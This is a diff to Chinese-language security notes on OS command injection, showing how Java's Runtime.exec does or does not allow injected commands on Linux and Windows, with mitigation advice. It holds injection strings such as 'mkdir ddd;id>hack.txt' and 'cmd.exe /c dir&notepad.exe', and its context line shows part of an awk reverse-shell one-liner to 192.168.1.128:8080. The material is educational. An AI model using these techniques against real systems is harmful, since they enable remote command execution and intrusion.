@@ -711,31 +711,88 @@ $ awk 'BEGIN{s="/inet/tcp/0/192.168.1.128/8080";for(;s|&getline c;close(c))while
 
 #### Java
 
+##### 仅执行特定程序, 无命令注入风险
+
 ```java
-import java.io.IOException;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
 public class OSi {
-    public static void main(String args[])
-    {
-        System.out.println("Start");
+    private static final Logger log = Logger.getLogger(OSi.class.getName());
 
-        String cmd = "mkdir ddd;id>hack.txt";
-        //String[] cmds = cmd.split(" ");
+    public static void main(String[] args) {
+        log.setLevel(Level.ALL);
+        log.entering("OSi", "main", "Start");
+
         try {
-            // 关注cmd是否 {==完全可控==}
-            // Runtime.getRuntime().exec(cmd);
-            // 关注String[] {==第一个元素==} 是否可控或为 {==/bin/sh==}
-            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
-        } catch (IOException e) {
-            System.out.println(e);
+            String cmd = "mkdir ddd;id>hack.txt";
+            // Runtime启动新的进程
+            // 创建名为 ddd;id>hack.txt 的目录, 不存在命令注入
+            Runtime.getRuntime().exec(cmd);
+        } catch (Exception e) {
+            log.severe(e.getMessage());
         }
 
-        System.out.println("End");
+        log.entering("OSi", "main", "End");
     }
 }
 ```
 
-!!! success "如果传入String[]且第一个元素不是`/bin/sh`, 则不存在命令注入"
+##### 执行脚本, Linux不存在命令注入
+
+```bash
+#!/bin/bash
+
+# filename: test.sh
+mkdir ddd
+```
+
+```java
+String cmd = "./test.sh | id>hack.txt";
+// 仅执行test.sh, 不存在命令注入
+Runtime.getRuntime().exec(cmd);
+```
+
+##### 执行脚本, Windows存在命令注入
+
+```bat
+@rem filename: test.bat
+@mkdir "D:\tmp\hackdir"
+@echo "waiting..."
+
+@rem 如果加上 @pause 则后面的命令无法执行
+```
+
+```java
+String cmd = "D:\\tmp\\test.bat & notepad.exe";
+// 存在命令注入!!!
+Runtime.getRuntime().exec(cmd);
+```
+
+##### sh -c 作为一个参数传入exec, 在Linux下不会执行
+
+```java
+String cmd = "/bin/sh -c test.sh | id>hack.txt";
+// 未执行任何命令
+Runtime.getRuntime().exec(cmd);
+```
+
+##### cmd.exe /c 作为一个参数传入exec, 在Windows下存在命令注入
+
+```java
+Runtime rt = Runtime.getRuntime();
+Process proc = rt.exec("cmd.exe /c dir" + "&notepad.exe");
+proc.waitFor();
+```
+
+##### sh -c 作为数组传入exec, 存在命令注入
+
+```java
+// String[] {==第一个元素==} 可控  或  为 {==/bin/sh -c==}
+// 第二条命令执行成功
+Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "test.sh;touch hack.txt"});
+```
+
 
 #### Python
 
@@ -769,6 +826,12 @@ public class OSi {
     ```
 
 - exec()
+
+### 消减措施
+
+1. 使用语言提供的标准API代替运行系统命令
+1. 对输入的数据进行白名单校验, 如: `Pattern.matches("[0-9a-zA-Z@]+", input)`
+1. 对特殊字符进行编码
 
 
 ## OGNL注入
